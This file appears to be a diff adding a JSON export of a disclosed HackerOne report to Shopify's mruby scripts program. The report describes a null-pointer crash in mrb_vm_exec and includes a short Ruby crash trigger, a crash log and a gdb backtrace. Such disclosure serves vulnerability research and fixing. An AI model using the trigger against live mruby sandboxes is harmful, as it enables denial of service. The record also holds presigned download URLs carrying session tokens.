@@ -1,0 +1,202 @@
+{
+  "id": 192485,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTI0ODU=",
+  "url": "https://hackerone.com/reports/192485",
+  "title": "SIGSEGV on mrb_vm_exec() Null Deref",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2016-12-19T17:58:23.452Z",
+  "submitted_at": "2016-12-19T17:58:23.452Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ston3",
+    "url": "/ston3",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15668,
+    "url": "https://hackerone.com/shopify-scripts",
+    "handle": "shopify-scripts",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "shopify-scripts",
+      "twitter_handle": "",
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-03-01T21:34:10.736Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2017-01-30T21:33:59.578Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Crash occurs when `mrb_value *pool` is passed null value.\n\nSample\n---------------------\n\nThe following code triggers the bug (attached as mrb_vm_exec.rb):\n\n\tProc.remove_method(:initialize)\n\tClass.new{define_method(:m){}\n\tdefine_method(:m0,Proc.new)}.new.m0\n\nCrash\n---------------------\nAttached as sandbox.log\n\n\tx@x:~/Desktop/research/mruby-engine/bin$ ./sandbox mrb_vm_exec.rb \n\t./sandbox:20: [BUG] Segmentation fault at 0x00000000000010\n\truby 2.2.6p396 (2016-11-15 revision 56800) [x86_64-linux-gnu]\n\n\t-- Control frame information -----------------------------------------------\n\tc:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\n\tc:0002 p:0186 s:0005 E:002528 EVAL   ./sandbox:20 [FINISH]\n\tc:0001 p:0000 s:0002 E:001740 TOP    [FINISH]\n\n\t-- Ruby level backtrace information ----------------------------------------\n\t./sandbox:20:in `<main>'\n\t./sandbox:20:in `sandbox_eval'\n\n\t-- Machine register context ------------------------------------------------\n\t RIP: 0x00007f34c0d865ad RBP: 0x0000000000000000 RSP: 0x00007f34bf90d9e0\n\t RAX: 0x00007f34bf921f30 RBX: 0x0000000000000000 RCX: 0x00007f34bf91ba00\n\t RDX: 0x00007f34bf921b28 RDI: 0x00007f34bf94ab00 RSI: 0x0000000000000000\n\t  R8: 0x0000000000000000  R9: 0x0000000000000000 R10: 0x0000000000000256\n\t R11: 0x0000000000000000 R12: 0x00007f34bf916fb0 R13: 0x00007f34bf91ba00\n\t R14: 0x0000000000000001 R15: 0x00007f34bf916f80 EFL: 0x0000000000010297\n\n\t-- C level backtrace information -------------------------------------------\n\t/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f34c548ad55]\n\t/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f34c548af8c]\n\t/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f34c536706b]\n\t/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f34c541d14e]\n\t/lib/x86_64-linux-gnu/libc.so.6 [0x7f34c4f67ff0]\n\nDebug\n---------------------\n\n\tx@x:~/Desktop/research/mruby-engine/bin$ gdb -q ruby\n\tReading symbols from ruby...(no debugging symbols found)...done.\n\t(gdb) r sandbox mrb_vm_exec.rb \n\tStarting program: /usr/bin/ruby sandbox mrb_vm_exec.rb\n\t[Thread debugging using libthread_db enabled]\n\tUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n\t[New Thread 0x7ffff7ff7700 (LWP 29428)]\n\t[New Thread 0x7ffff1f73700 (LWP 29487)]\n\tProgram received signal SIGSEGV, Segmentation fault.\n\tmrb_vm_exec (mrb=mrb@entry=0x7ffff1f744e0, proc=0x7ffff1f7bfb0, proc@entry=0x7ffff1f7c130, pc=0x7ffff1fd3bac) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1197\n\t1197\t        pool = irep->pool;\n\t(gdb) list *$rip\n\t0x7ffff33eb5ad is in mrb_vm_exec (/home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1197).\n\t1192\t      }\n\t1193\t      else {\n\t1194\t        /* setup environment for calling method */\n\t1195\t        proc = mrb->c->ci->proc = m;\n\t1196\t        irep = m->body.irep;\n\t1197\t        pool = irep->pool;\n\t1198\t        syms = irep->syms;\n\t1199\t        ci->nregs = irep->nregs;\n\t1200\t        if (n == CALL_MAXARGS) {\n\t1201\t          ci->argc = -1;\n\n\t(gdb) p *irep\n\t$1 = {nlocals = 1, nregs = 4, flags = 0 '\\000', iseq = 0x7ffff1fd3b90, pool = 0x0, syms = 0x7ffff1f957e0, reps = 0x7ffff1f99070, lv = 0x0, filename = 0x7ffff1f9b210 \"mruby-engine.rb\", lines = 0x7ffff1fd4ba0, \n\t  debug_info = 0x7ffff1f95bf0, ilen = 9, plen = 0, slen = 6, rlen = 1, refcnt = 1}\n\t(gdb) p irep->pool\n\t$2 = (mrb_value *) 0x0\n\nBacktrace\n---------------------\n\n\t(gdb) bt\n\t#0  mrb_vm_exec (mrb=mrb@entry=0x7ffff1f744e0, proc=0x7ffff1f7bfb0, proc@entry=0x7ffff1f7c130, pc=0x7ffff1fd3bac) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1197\n\t#1  0x00007ffff33f181c in mrb_vm_run (mrb=0x7ffff1f744e0, proc=0x7ffff1f7c130, self=..., stack_keep=stack_keep@entry=0) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:770\n\t#2  0x00007ffff33df41e in mruby_engine_monitored_eval (data=0x7ffff1f743e0) at ../../../../ext/mruby_engine/eval_monitored.c:68\n\t#3  0x00007ffff7380182 in start_thread (arg=0x7ffff1f73700) at pthread_create.c:312\n\t#4  0x00007ffff769130d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:111\n\nImpact\n---------------------\n\nThis vulnerability is caused by NullPointer error. It can not be exploited, but it can cause DoS.",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 145095,
+      "file_name": "mrb_vm_exec.rb",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/145/095/01f96f44bd8aaf0529efc3b4059793c69b886c5f/mrb_vm_exec.rb?response-content-disposition=attachment%3B%20filename%3D%22mrb_vm_exec.rb%22%3B%20filename%2A%3DUTF-8%27%27mrb_vm_exec.rb&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7ZQ64IHF%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T064128Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIH66ULUjNnS2co8ugkBObjEHglx5O5HYemXAeKU1Dp4tAiAXF6poxlhlK74A3pJSywfr3Zei1lEgAKuKLxI%2Fxix4RyqyBQh%2FEAMaDDAxMzYxOTI3NDg0OSIMaCZn4A7FqO0L88uMKo8F2P2iUNosIbgYaH9qJTfgmFQmbaO1yPBWMdDbSrot%2Fh5BHJ%2FLJzrSCrSOOTBv9vkmRYCCQr6%2B%2FGc7eSoHHY%2Fg9KKE0aNe84VPmXShj2UBhPuZGGShOJbG78Gqp%2BfQuDUH0AAjYSMLUbDNknlnGj16IxXkyL5wwQgyGJKz%2Fv3Vje32bIxUKL5N1Ht624C0eOcrW8yUiXfCrm3%2BDNqAcA1Dep6s3RUTJCk%2BhaWiFGvg5IFaxhv%2Bg16QlhH50de95%2BXHVKq9PIgF8PrfcPb5oKyU%2BPjmvFFdhT8qbuinulc%2BQK4rt8PMFV9uYtfAxcOuF0j13fZiOeYBvSZUT5yvMqUyhXQ2ZOsfrj7TQRqINYvpCL89RH5NZx9x%2BnyhcZyXgD9ZCRNKkgu61C6tUPfEvKmfdrKyiLQ4XMo6zSqACbjIBFo2WF5Dtk0ybZDOfpbmxf00XeD%2FGtf3nPjbiGzLJe38nBvMant%2BMJBdM1CIwwGWvS9Bre9RuOo2iOBINoXV%2FqcSjM7At%2FYWVo6tcx6lN%2Be7tTz8vMX9U7tD61%2BfSWq0PphzCSLsCexOQvL%2Fgy4vpvHeEuai8K793hoeQ%2BAGt2PaHFNzJ%2FTpG%2BOvt%2FFNrrq15dMwC4YqDq%2BQ5W%2FyuoClSRyU5aBKI9xlFsQuIg4VrgzUjIxFFngYBeIxBa%2B5ako7%2BdJnrPpsvNmWaJTZbBC1WOeAGq%2Frm8LGvnPpUQDG7OUgIG%2FtTqnKxRpAkBKmZo%2BcbN0JThKkd2XUdnNxSphUTSdmuEqgQ9dHFPx%2FiSwyKNlyZFH68CWXW4F7b0glV33eAdG4e3QIp4TCvtPjEeWMrrk8DUIvGpUbimuKmwBYGrJIspJUbPXc6y9M2sFqBYnF0DDJy7fSBjqyAchyFc4ea2IppZTorm6qat7%2F97hfwMJSSCZZp3eNGFh1bL5WlLyfY22jrLJFGMuXCk4vSye5j3X78XEsRVu8jkeegmL8pYROGepMrrj%2BafytPOmYXXwmV65dEyj00hxGZGaBH4pz7vtdNQnUcA4ZcCE0jE4ryzgHhjaqQQJsDTkzMb0TgYA%2BOYnLs%2Fn%2B2XsCr%2B79DO3BbNAVEqotswkh1pm0SKyeFLdOhP8THcbN6t3SIPc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f0964a0dc5573fada60172b0543a172a02d3179ed2d59b22d4acbaac52a0d74b",
+      "file_size": 97,
+      "type": "text/plain",
+      "moderated": null
+    },
+    {
+      "id": 145096,
+      "file_name": "sandbox.log",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/145/096/39ae3142b45f6db2d780a768a9a579179d7109f4/sandbox.log?response-content-disposition=attachment%3B%20filename%3D%22sandbox.log%22%3B%20filename%2A%3DUTF-8%27%27sandbox.log&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7ZQ64IHF%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T064128Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIH66ULUjNnS2co8ugkBObjEHglx5O5HYemXAeKU1Dp4tAiAXF6poxlhlK74A3pJSywfr3Zei1lEgAKuKLxI%2Fxix4RyqyBQh%2FEAMaDDAxMzYxOTI3NDg0OSIMaCZn4A7FqO0L88uMKo8F2P2iUNosIbgYaH9qJTfgmFQmbaO1yPBWMdDbSrot%2Fh5BHJ%2FLJzrSCrSOOTBv9vkmRYCCQr6%2B%2FGc7eSoHHY%2Fg9KKE0aNe84VPmXShj2UBhPuZGGShOJbG78Gqp%2BfQuDUH0AAjYSMLUbDNknlnGj16IxXkyL5wwQgyGJKz%2Fv3Vje32bIxUKL5N1Ht624C0eOcrW8yUiXfCrm3%2BDNqAcA1Dep6s3RUTJCk%2BhaWiFGvg5IFaxhv%2Bg16QlhH50de95%2BXHVKq9PIgF8PrfcPb5oKyU%2BPjmvFFdhT8qbuinulc%2BQK4rt8PMFV9uYtfAxcOuF0j13fZiOeYBvSZUT5yvMqUyhXQ2ZOsfrj7TQRqINYvpCL89RH5NZx9x%2BnyhcZyXgD9ZCRNKkgu61C6tUPfEvKmfdrKyiLQ4XMo6zSqACbjIBFo2WF5Dtk0ybZDOfpbmxf00XeD%2FGtf3nPjbiGzLJe38nBvMant%2BMJBdM1CIwwGWvS9Bre9RuOo2iOBINoXV%2FqcSjM7At%2FYWVo6tcx6lN%2Be7tTz8vMX9U7tD61%2BfSWq0PphzCSLsCexOQvL%2Fgy4vpvHeEuai8K793hoeQ%2BAGt2PaHFNzJ%2FTpG%2BOvt%2FFNrrq15dMwC4YqDq%2BQ5W%2FyuoClSRyU5aBKI9xlFsQuIg4VrgzUjIxFFngYBeIxBa%2B5ako7%2BdJnrPpsvNmWaJTZbBC1WOeAGq%2Frm8LGvnPpUQDG7OUgIG%2FtTqnKxRpAkBKmZo%2BcbN0JThKkd2XUdnNxSphUTSdmuEqgQ9dHFPx%2FiSwyKNlyZFH68CWXW4F7b0glV33eAdG4e3QIp4TCvtPjEeWMrrk8DUIvGpUbimuKmwBYGrJIspJUbPXc6y9M2sFqBYnF0DDJy7fSBjqyAchyFc4ea2IppZTorm6qat7%2F97hfwMJSSCZZp3eNGFh1bL5WlLyfY22jrLJFGMuXCk4vSye5j3X78XEsRVu8jkeegmL8pYROGepMrrj%2BafytPOmYXXwmV65dEyj00hxGZGaBH4pz7vtdNQnUcA4ZcCE0jE4ryzgHhjaqQQJsDTkzMb0TgYA%2BOYnLs%2Fn%2B2XsCr%2B79DO3BbNAVEqotswkh1pm0SKyeFLdOhP8THcbN6t3SIPc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e74ee909df8032e3e18afec6e6680bcc279ebeccd93522f140838a3f73031e7a",
+      "file_size": 33926,
+      "type": "text/plain",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-03-01T21:33:59.616Z",
+  "allow_singular_disclosure_after": -295088849.1317623,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "apapedulimu",
+    "eveeez",
+    "spetr0x"
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "192485",
+  "votes": 3,
+  "latest_disclosable_activity_at": "2017-03-01T21:34:10.762Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T14:41:28.874469",
+    "source": "https://hackerone.com/reports/192485.json",
+    "report_id": 192485
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTI0ODU=",
+    "databaseId": "192485",
+    "title": "SIGSEGV on mrb_vm_exec() Null Deref",
+    "url": "https://hackerone.com/reports/192485",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2017-03-01T21:34:10.736Z",
+    "created_at": "2016-12-19T17:58:23.452Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzQ4",
+      "name": "Uncontrolled Resource Consumption",
+      "external_id": "cwe-400"
+    },
+    "severity": {
+      "rating": "low",
+      "score": null
+    },
+    "reporter": {
+      "username": "ston3"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE1NjY4",
+      "handle": "shopify-scripts",
+      "name": "shopify-scripts",
+      "url": "https://hackerone.com/shopify-scripts",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS80MTAxNQ==",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2017-01-30T21:33:45.435Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzE5MjQ4NQ==",
+    "_id": "192485",
+    "disclosed": true,
+    "votes": 3,
+    "latest_disclosable_activity_at": "2017-03-01T21:34:10.762Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTI0ODU=",
+      "databaseId": "192485",
+      "title": "SIGSEGV on mrb_vm_exec() Null Deref",
+      "url": "https://hackerone.com/reports/192485",
+      "disclosed_at": "2017-03-01T21:34:10.736Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE1NjY4",
+      "handle": "shopify-scripts",
+      "name": "shopify-scripts",
+      "url": "https://hackerone.com/shopify-scripts",
+      "currency": "usd"
+    }
+  }
+}
